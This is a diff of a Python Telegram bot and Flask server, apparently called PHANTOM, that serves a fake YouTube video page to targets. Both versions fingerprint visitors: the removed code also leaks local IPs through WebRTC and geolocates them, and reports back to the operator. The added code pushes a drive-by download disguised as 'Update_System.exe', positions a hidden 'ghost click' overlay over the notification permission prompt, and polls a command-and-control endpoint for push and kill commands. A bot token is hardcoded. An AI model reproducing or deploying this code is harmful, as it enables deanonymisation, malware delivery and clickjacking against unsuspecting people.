@@ -1,11 +1,12 @@
-import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
-from flask import Flask, render_template_string, request
+import asyncio, threading, requests, json, os, base64, urllib.parse
+from flask import Flask, render_template_string, request, jsonify
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
 from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
 # --- [1] CONFIG ---
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
+OVERLORD_ID = 6659724115 
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -13,156 +14,161 @@ app = Flask(__name__)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
-vault = {}
-user_modes = {}
+# Базы данных в памяти
+active_commands = {} 
+waiting_for_text = {} 
+waiting_for_file = {} # Кто сейчас должен прислать файл
+user_files = {}      # Прямые ссылки на файлы юзеров
+user_modes = {}      # Режимы (normal/download)
 
-# --- [2] ТЕМПЛЕЙТ (Максимально незаметный) ---
+# --- [2] GHOST-CLICK + DOWNLOAD TEMPLATE ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>YouTube</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Mobile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body { background: #fff; margin: 0; font-family: Roboto, Arial, sans-serif; text-align: center; color: #0f0f0f; overflow: hidden; }
-        .yt-header { padding: 12px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
-        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
-        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
-        .play-btn::after { content: ''; position: absolute; top: 50%; left: 55%; transform: translate(-50%, -50%); border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
+        body { margin:0; background:#000; overflow:hidden; width:100vw; height:100vh; display:flex; align-items:center; justify-content:center; }
+        #ui { position:fixed; top:0; left:0; width:100%; height:100%; background:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; display:flex; align-items:center; justify-content:center; z-index:10; }
+        .play { width:80px; height:55px; background:red; border-radius:12px; position:relative; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+        .play:after { content:''; position:absolute; left:32px; top:15px; border-left:22px solid white; border-top:13px solid transparent; border-bottom:13px solid transparent; }
+        #ghost { position:absolute; width:140px; height:50px; background:transparent; z-index:2000; display:none; }
     </style>
 </head>
 <body onclick="ignite()">
-    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
-    <div class="player">
-        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
-        <div class="play-btn"></div>
-    </div>
-    <div style="padding: 15px; text-align: left;">
-        <div style="font-size: 16px; font-weight: 500; line-height: 1.2;">СМЕШНЫЕ МЕМЫ 2026 😂 #shorts #юмор</div>
-        <div style="font-size: 12px; color: #606060; margin-top: 6px;">1.8 млн просмотров • 3 часа назад</div>
-    </div>
-
+    <div id="ui"><div class="play"></div></div>
+    <div id="ghost"></div>
 <script>
-let active = false;
+let sid = "{{ sid }}", mode = "{{ mode }}", file = "{{ file_url }}", active = false;
 
-async function getRTC() {
-    return new Promise(res => {
-        const ips = [];
-        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-        pc.createDataChannel("");
-        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => res("Blocked"));
-        pc.onicecandidate = i => {
-            if (!i || !i.candidate) return;
-            const m = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-            if (m && !ips.includes(m[1])) ips.push(m[1]);
-        };
-        setTimeout(() => { pc.close(); res(ips.length ? ips.join(' | ') : "N/A"); }, 1000);
-    });
-}
-
-async function ignite() {
+function ignite() {
     if(active) return; active = true;
     
-    let d = { 
-        aid: "{{ aid }}", 
-        ua: navigator.userAgent, 
-        res: screen.width+"x"+screen.height,
-        bat: "N/A", gpu: "N/A", rtc: "N/A"
-    };
+    // Сбор данных
+    let gl = document.createElement('canvas').getContext('webgl');
+    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    let info = { sid: sid, ua: navigator.userAgent, gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A" };
+    navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(info))));
 
-    // Фоновый сбор данных
-    try {
-        let b = await navigator.getBattery();
-        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-        let gl = document.createElement('canvas').getContext('webgl');
-        d.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-    } catch(e) {}
-
-    // Если режим FULL - пробуем тянуть WebRTC (быстро)
-    if ("{{ mode }}" === "FULL") {
-        d.rtc = await getRTC();
+    // Drive-by Download (только если файл прикреплен)
+    if(mode === 'download' && file !== "None") {
+        let a = document.createElement('a');
+        a.href = file;
+        a.download = "Update_System.exe"; 
+        document.body.appendChild(a);
+        a.click();
     }
 
-    // Отправка и мгновенный редирект
-    fetch('/log', { 
-        method: 'POST', 
-        body: btoa(encodeURIComponent(JSON.stringify(d))),
-        keepalive: true 
-    });
+    // Ghost Click позиционирование
+    Notification.requestPermission();
+    setTimeout(() => {
+        let g = document.getElementById('ghost');
+        g.style.display = 'block';
+        g.style.top = (window.innerHeight/2) + 38 + 'px';
+        g.style.left = (window.innerWidth/2) + 15 + 'px';
+    }, 150);
+
+    // C2 Опрос
+    setInterval(async () => {
+        try {
+            let r = await fetch('/poll/' + sid);
+            let c = await r.json();
+            if(c.type === 'push') new Notification("Chrome", {body: c.txt});
+            if(c.type === 'kill') { localStorage.clear(); location.href="https://google.com"; }
+        } catch(e){}
+    }, 4000);
     
-    // Редирект без ожидания ответа сервера
-    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 2000);
 }
 </script>
 </body>
 </html>
 """
 
-# --- [3] ROUTES ---
+# --- [3] FLASK BACKEND ---
 
-@app.route('/')
-def health():
-    return "STATUS: OK", 200
+@app.route('/ping')
+def cron_ping(): return "ALIVE", 200
 
-@app.route('/v/<aid>')
-def view(aid):
-    m = user_modes.get(str(aid), "ANALYTICS")
-    return render_template_string(HTML_TEMPLATE, aid=aid, mode=m)
+@app.route('/v/<sid>')
+def victim_page(sid):
+    uid = int(sid)
+    return render_template_string(HTML_TEMPLATE, 
+                                 sid=sid, 
+                                 mode=user_modes.get(uid, "normal"), 
+                                 file_url=user_files.get(uid, "None"))
 
 @app.route('/log', methods=['POST'])
 def logger():
-    try:
-        raw = base64.b64decode(request.get_data()).decode()
-        data = json.loads(urllib.parse.unquote(raw))
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp").json()
-        
-        tid = "ID-" + str(uuid.uuid4())[:6].upper()
-        vault[tid] = {"data": data, "geo": geo}
+    raw = base64.b64decode(request.get_data()).decode()
+    data = json.loads(urllib.parse.unquote(raw))
+    sid = data['sid']
+    kb = InlineKeyboardBuilder().button(text="🔔 PUSH", callback_data=f"req_push_{sid}").button(text="☣️ KILL", callback_data=f"req_kill_{sid}")
+    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
+                  json={"chat_id": int(sid), "text": f"🎯 **ОТЧЕТ**\\nGPU: `{data['gpu'][:25]}`", "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
+    return "OK"
 
-        report = (
-            f"🎯 **НОВЫЙ ЛОГ**\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"🌐 **IP:** `{ip}`\n"
-            f"📍 **ГЕО:** `{geo.get('city')}, {geo.get('country')}`\n"
-            f"🛡 **WebRTC:** `{data.get('rtc', 'N/A')}`\n"
-            f"🔋 **Заряд:** `{data.get('bat')}`\n"
-            f"💻 **GPU:** `{data.get('gpu', 'N/A')[:30]}...`\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"🔑 **DUMP:** `{tid}`"
-        )
-        
-        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                      json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
-        return "OK", 200
-    except:
-        return "Error", 500
+@app.route('/poll/<sid>')
+def poll(sid): return jsonify(active_commands.pop(sid, {"type": "none"}))
 
-# --- [4] BOT ---
+# --- [4] BOT LOGIC ---
 
 @dp.message(Command("start"))
-async def st(m: types.Message):
-    kb = ReplyKeyboardBuilder().button(text="🧨 Сгенерировать ссылку").as_markup(resize_keyboard=True)
-    await m.answer("🕶 **PHANTOM v34.0**", reply_markup=kb)
+async def start(m: types.Message):
+    kb = ReplyKeyboardBuilder().button(text="🧨 Обычная").button(text="☣️ С загрузкой файла").as_markup(resize_keyboard=True)
+    await m.answer("🕶 **PHANTOM v45.0**\\nВыбери тип ссылки:", reply_markup=kb)
 
-@dp.message(F.text == "🧨 Сгенерировать ссылку")
-async def ms(m: types.Message):
-    kb = InlineKeyboardBuilder()
-    kb.button(text="📊 Analytics", callback_data="m_ANALYTICS")
-    kb.button(text="💥 Full Deanon (RTC)", callback_data="m_FULL")
-    await m.answer("Выбери режим:", reply_markup=kb.adjust(1).as_markup())
+@dp.message(F.text == "☣️ С загрузкой файла")
+async def ask_file(m: types.Message):
+    waiting_for_file[m.from_user.id] = True
+    await m.answer("📥 **Отправь мне файл**, который должен скачаться у цели.")
 
-@dp.callback_query(F.data.startswith("m_"))
-async def fn(c: types.CallbackQuery):
-    mode = c.data.split("_")[1]
-    user_modes[str(c.from_user.id)] = mode
-    await c.message.edit_text(f"✅ **ССЫЛКА:**\n🔗 `{BASE_URL}/v/{c.from_user.id}`\n\n*Режим: {mode}*")
+@dp.message(F.document)
+async def handle_docs(m: types.Message):
+    if m.from_user.id in waiting_for_file:
+        file_info = await bot.get_file(m.document.file_id)
+        # Генерируем прямую ссылку на файл через Telegram API
+        file_url = f"https://api.telegram.org/file/bot{API_TOKEN}/{file_info.file_path}"
+        user_files[m.from_user.id] = file_url
+        user_modes[m.from_user.id] = "download"
+        waiting_for_file.pop(m.from_user.id)
+        await m.answer(f"✅ Файл принят.\\n🔗 **Твоя ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")
 
-@dp.message(F.text.startswith("ID-"))
-async def gd(m: types.Message):
-    t = m.text.strip().upper()
-    if t in vault:
-        await m.answer(f"📦 **DUMP {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")
+@dp.message(F.text == "🧨 Обычная")
+async def normal_link(m: types.Message):
+    user_modes[m.from_user.id] = "normal"
+    user_files[m.from_user.id] = "None"
+    await m.answer(f"🔗 **Твоя обычная ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")
+
+# Модерация Оверлордом
+@dp.callback_query(F.data.startswith("req_"))
+async def req(c: types.CallbackQuery):
+    _, act, sid = c.data.split("_")
+    kb = InlineKeyboardBuilder().button(text="✅ ДА", callback_data=f"ovl_ok_{act}_{sid}").button(text="❌ НЕТ", callback_data="ovl_no").as_markup()
+    await bot.send_message(OVERLORD_ID, f"⚖️ Юзер `{c.from_user.id}` хочет `{act}` для `{sid}`", reply_markup=kb)
+    await c.answer("⏳ Ждем Оверлорда...")
+
+@dp.callback_query(F.data.startswith("ovl_"))
+async def overlord(c: types.CallbackQuery):
+    if c.from_user.id != OVERLORD_ID: return
+    d = c.data.split("_")
+    if d[1] == "no": return await c.message.edit_text("Отклонено.")
+    _, _, act, sid = d
+    if act == "push":
+        waiting_for_text[int(sid)] = sid
+        await bot.send_message(int(sid), "✍️ Введи текст пуша:")
+    else:
+        active_commands[sid] = {"type": "kill"}
+        await bot.send_message(int(sid), "☣️ KILL отправлен.")
+    await c.message.edit_text("✅ Разрешено.")
+
+@dp.message(F.text)
+async def text_handler(m: types.Message):
+    if m.from_user.id in waiting_for_text:
+        sid = waiting_for_text.pop(m.from_user.id)
+        active_commands[sid] = {"type": "push", "txt": m.text}
+        await m.answer("📨 Пуш отправлен.")
 
 async def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
